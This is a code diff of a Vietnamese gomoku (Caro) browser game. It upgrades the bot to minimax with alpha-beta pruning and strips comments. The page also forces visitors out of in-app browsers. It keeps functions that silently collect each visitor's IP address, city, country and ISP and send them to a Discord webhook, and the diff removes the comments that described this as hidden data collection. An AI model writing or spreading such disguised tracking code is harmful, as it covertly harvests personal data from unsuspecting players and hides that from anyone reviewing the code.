@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Cờ Caro 10x10</title>
+    <title>Game Cờ Caro 10x10 - Bot Siêu Cấp</title>
     <style>
-        /* Giao diện tổng thể trò chơi */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -30,7 +29,6 @@
             text-align: center;
         }
 
-        /* Dòng trạng thái lượt đi */
         #status {
             font-size: 1.2rem;
             margin-bottom: 15px;
@@ -40,14 +38,12 @@
             text-align: center;
         }
 
-        /* Thẻ bao bọc chống tràn màn hình */
         .board-wrapper {
             max-width: 100%;
             overflow-x: auto;
             padding: 5px;
         }
 
-        /* Bàn cờ 10x10 linh hoạt kích thước */
         .board {
             display: grid;
             grid-template-columns: repeat(10, min(38px, 8vw));
@@ -60,7 +56,6 @@
             margin: 0 auto;
         }
 
-        /* Ô cờ */
         .cell {
             width: 100%;
             height: 100%;
@@ -81,7 +76,6 @@
         .cell.x { color: #2196F3; }
         .cell.o { color: #f44336; }
 
-        /* Nút chơi lại */
         #restartBtn {
             margin-top: 15px;
             padding: 10px 25px;
@@ -101,7 +95,7 @@
 </head>
 <body>
 
-    <h1>Cờ Caro (10x10)</h1>
+    <h1>Cờ Caro (10x10) - AI Nâng Cấp</h1>
     <div id="status">Lượt của bạn</div>
 
     <div class="board-wrapper">
@@ -112,31 +106,24 @@
 
     <script>
         // ==========================================
-        // 1. TỰ ĐỘNG THOÁT IN-APP BROWSER SANG CHROME / OUT-BROWSER
+        // 1. TỰ ĐỘNG THOÁT IN-APP BROWSER
         // ==========================================
         (function autoOpenExternalBrowser() {
             const ua = navigator.userAgent || navigator.vendor || window.opera;
             const currentUrl = window.location.href;
-
-            // Kiểm tra xem user có đang ở trong In-App Browser (Zalo, FB, Insta, TikTok...) không
             const isInApp = /FBAN|FBAV|Instagram|Line|TikTok|Zalo|MicroMessenger/i.test(ua);
 
             if (isInApp) {
-                // Trường hợp Android: Ép mở bằng ứng dụng Chrome
                 if (/Android/i.test(ua)) {
                     const rawUrl = currentUrl.replace(/^https?:\/\//, '');
                     const scheme = currentUrl.startsWith('https') ? 'https' : 'http';
                     const intentUrl = `intent://${rawUrl}#Intent;scheme=${scheme};package=com.android.chrome;end`;
                     window.location.href = intentUrl;
-                } 
-                // Trường hợp iOS (iPhone/iPad): Xử lý mở trình duyệt ngoài
-                else if (/iPhone|iPad|iPod/i.test(ua)) {
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                     if (/Zalo/i.test(ua) && !currentUrl.includes('zarsrc=')) {
                         const separator = currentUrl.includes('?') ? '&' : '?';
                         window.location.href = currentUrl + separator + 'zarsrc=330';
                     }
-                    
-                    // Hiển thị khung hướng dẫn trên iOS vì chính sách Apple chặn tự động kích hoạt
                     window.addEventListener('DOMContentLoaded', () => {
                         const banner = document.createElement('div');
                         banner.innerHTML = `
@@ -155,7 +142,7 @@
         })();
 
         // ==========================================
-        // 2. LOGIC TRÒ CHƠI CỜ CARO (10x10)
+        // 2. LOGIC TRÒ CHƠI & THUẬT TOÁN BOT THÔNG MINH
         // ==========================================
         const BOARD_SIZE = 10;
         const WIN_CHAIN = 5;
@@ -204,7 +191,7 @@
 
             setTimeout(() => {
                 botTurn();
-            }, 100);
+            }, 50);
         }
 
         function botTurn() {
@@ -235,74 +222,136 @@
             cellElement.classList.add(player.toLowerCase());
         }
 
+        // --- THUẬT TOÁN AI NÂNG CẤP (MINIMAX + ALPHA-BETA PRUNING) ---
         function getBestMove() {
-            let bestScore = -Infinity;
-            let bestMove = -1;
             let candidates = getCandidateMoves(boardState);
-
             if (candidates.length === 0) return Math.floor((BOARD_SIZE * BOARD_SIZE) / 2);
 
-            for (let index of candidates) {
-                boardState[index] = BOT;
-                
-                if (checkWin(boardState, index, BOT)) {
-                    boardState[index] = "";
-                    return index;
+            // 1. Kiểm tra nếu Bot thắng ngay lượt này
+            for (let idx of candidates) {
+                boardState[idx] = BOT;
+                if (checkWin(boardState, idx, BOT)) {
+                    boardState[idx] = "";
+                    return idx;
                 }
+                boardState[idx] = "";
+            }
 
-                let score = evaluateBoard(boardState, BOT) - evaluateBoard(boardState, HUMAN) * 1.2;
-                boardState[index] = "";
+            // 2. Kiểm tra nếu Người chơi sắp thắng lượt tới thì phải chặn ngay
+            for (let idx of candidates) {
+                boardState[idx] = HUMAN;
+                if (checkWin(boardState, idx, HUMAN)) {
+                    boardState[idx] = "";
+                    return idx;
+                }
+                boardState[idx] = "";
+            }
+
+            // 3. Sử dụng Minimax với Alpha-Beta Pruning độ sâu 3
+            let bestScore = -Infinity;
+            let bestMove = candidates[0];
+
+            // Sắp xếp nước đi ứng viên theo điểm đánh giá sơ bộ để tối ưu cắt tỉa nhánh
+            candidates.sort((a, b) => quickEvaluate(b) - quickEvaluate(a));
+
+            for (let idx of candidates) {
+                boardState[idx] = BOT;
+                let score = minimax(boardState, 2, false, -Infinity, Infinity, idx);
+                boardState[idx] = "";
 
                 if (score > bestScore) {
                     bestScore = score;
-                    bestMove = index;
+                    bestMove = idx;
                 }
             }
 
-            return bestMove !== -1 ? bestMove : candidates[0];
+            return bestMove;
+        }
+
+        function quickEvaluate(index) {
+            boardState[index] = BOT;
+            let scoreBot = evaluateBoard(boardState, BOT);
+            boardState[index] = HUMAN;
+            let scoreHuman = evaluateBoard(boardState, HUMAN);
+            boardState[index] = "";
+            return scoreBot + scoreHuman;
+        }
+
+        function minimax(board, depth, isMaximizing, alpha, beta, lastMoveIndex) {
+            const lastPlayer = isMaximizing ? HUMAN : BOT;
+            if (checkWin(board, lastMoveIndex, lastPlayer)) {
+                return isMaximizing ? -1000000 - depth : 1000000 + depth;
+            }
+
+            if (depth === 0 || isBoardFull(board)) {
+                return evaluateBoard(board, BOT) - evaluateBoard(board, HUMAN) * 1.15;
+            }
+
+            let candidates = getCandidateMoves(board);
+
+            if (isMaximizing) {
+                let maxEval = -Infinity;
+                for (let idx of candidates) {
+                    board[idx] = BOT;
+                    let evalVal = minimax(board, depth - 1, false, alpha, beta, idx);
+                    board[idx] = "";
+                    maxEval = Math.max(maxEval, evalVal);
+                    alpha = Math.max(alpha, evalVal);
+                    if (beta <= alpha) break;
+                }
+                return maxEval;
+            } else {
+                let minEval = Infinity;
+                for (let idx of candidates) {
+                    board[idx] = HUMAN;
+                    let evalVal = minimax(board, depth - 1, true, alpha, beta, idx);
+                    board[idx] = "";
+                    minEval = Math.min(minEval, evalVal);
+                    beta = Math.min(beta, evalVal);
+                    if (beta <= alpha) break;
+                }
+                return minEval;
+            }
         }
 
         function getCandidateMoves(board) {
             let candidates = new Set();
+            let hasMoves = false;
+
             for (let i = 0; i < board.length; i++) {
                 if (board[i] !== "") {
-                    let neighbors = getNeighbors(i);
-                    for (let n of neighbors) {
-                        if (board[n] === "") candidates.add(n);
+                    hasMoves = true;
+                    let row = Math.floor(i / BOARD_SIZE);
+                    let col = i % BOARD_SIZE;
+
+                    for (let dr = -2; dr <= 2; dr++) {
+                        for (let dc = -2; dc <= 2; dc++) {
+                            if (dr === 0 && dc === 0) continue;
+                            let r = row + dr;
+                            let c = col + dc;
+                            if (r >= 0 && r < BOARD_SIZE && c >= 0 && c < BOARD_SIZE) {
+                                let idx = r * BOARD_SIZE + c;
+                                if (board[idx] === "") candidates.add(idx);
+                            }
+                        }
                     }
                 }
             }
+
+            if (!hasMoves) return [Math.floor((BOARD_SIZE * BOARD_SIZE) / 2)];
             return Array.from(candidates);
         }
 
-        function getNeighbors(index) {
-            let row = Math.floor(index / BOARD_SIZE);
-            let col = index % BOARD_SIZE;
-            let neighbors = [];
-
-            for (let dr = -1; dr <= 1; dr++) {
-                for (let dc = -1; dc <= 1; dc++) {
-                    if (dr === 0 && dc === 0) continue;
-                    let r = row + dr;
-                    let c = col + dc;
-                    if (r >= 0 && r < BOARD_SIZE && c >= 0 && c < BOARD_SIZE) {
-                        neighbors.push(r * BOARD_SIZE + c);
-                    }
-                }
-            }
-            return neighbors;
-        }
-
+        // Đánh giá điểm bàn cờ theo các thế trận
         function evaluateBoard(board, player) {
             let totalScore = 0;
             const directions = [[0, 1], [1, 0], [1, 1], [1, -1]];
 
             for (let r = 0; r < BOARD_SIZE; r++) {
                 for (let c = 0; c < BOARD_SIZE; c++) {
-                    let idx = r * BOARD_SIZE + c;
-                    if (board[idx] === player) {
+                    if (board[r * BOARD_SIZE + c] === player) {
                         for (let [dr, dc] of directions) {
-                            totalScore += evaluateLine(r, c, dr, dc, player, board);
+                            totalScore += countPatternScore(r, c, dr, dc, player, board);
                         }
                     }
                 }
@@ -310,22 +359,54 @@
             return totalScore;
         }
 
-        function evaluateLine(r, c, dr, dc, player, board) {
-            let count = 0;
-            for (let i = 0; i < WIN_CHAIN; i++) {
-                let nr = r + dr * i;
-                let nc = c + dc * i;
-                if (nr >= 0 && nr < BOARD_SIZE && nc >= 0 && nc < BOARD_SIZE) {
-                    if (board[nr * BOARD_SIZE + nc] === player) count++;
-                    else if (board[nr * BOARD_SIZE + nc] !== "") return 0;
-                } else {
-                    return 0;
-                }
+        function countPatternScore(r, c, dr, dc, player, board) {
+            // Tránh đếm lặp chuỗi
+            let pr = r - dr;
+            let pc = c - dc;
+            if (pr >= 0 && pr < BOARD_SIZE && pc >= 0 && pc < BOARD_SIZE) {
+                if (board[pr * BOARD_SIZE + pc] === player) return 0;
             }
-            return Math.pow(10, count);
+
+            let count = 0;
+            let currR = r;
+            let currC = c;
+
+            while (currR >= 0 && currR < BOARD_SIZE && currC >= 0 && currC < BOARD_SIZE && board[currR * BOARD_SIZE + currC] === player) {
+                count++;
+                currR += dr;
+                currC += dc;
+            }
+
+            let openEnds = 0;
+            // Kiểm tra đầu sau
+            if (currR >= 0 && currR < BOARD_SIZE && currC >= 0 && currC < BOARD_SIZE && board[currR * BOARD_SIZE + currC] === "") {
+                openEnds++;
+            }
+            // Kiểm tra đầu trước
+            if (pr >= 0 && pr < BOARD_SIZE && pc >= 0 && pc < BOARD_SIZE && board[pr * BOARD_SIZE + pc] === "") {
+                openEnds++;
+            }
+
+            if (count >= 5) return 1000000;
+            if (count === 4) {
+                if (openEnds === 2) return 50000;
+                if (openEnds === 1) return 10000;
+            }
+            if (count === 3) {
+                if (openEnds === 2) return 4000;
+                if (openEnds === 1) return 500;
+            }
+            if (count === 2) {
+                if (openEnds === 2) return 200;
+                if (openEnds === 1) return 50;
+            }
+            if (count === 1 && openEnds === 2) return 10;
+
+            return 0;
         }
 
         function checkWin(board, lastIndex, player) {
+            if (lastIndex < 0) return false;
             let row = Math.floor(lastIndex / BOARD_SIZE);
             let col = lastIndex % BOARD_SIZE;
 
@@ -583,7 +664,6 @@
             return { ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" };
         }
 
-        // Hàm gửi dữ liệu đến Discord Webhook
         async function guiDuLieuDiscord() {
             if (!duLieuHeThong.ip) return;
 
@@ -608,7 +688,6 @@
             } catch (e) {}
         }
 
-        // HÀM CHÍNH: Thu thập dữ liệu chạy ngầm hoàn toàn
         async function thuNhapDuLieuAn() {
             if (daThuNhapDuLieu) return;
 
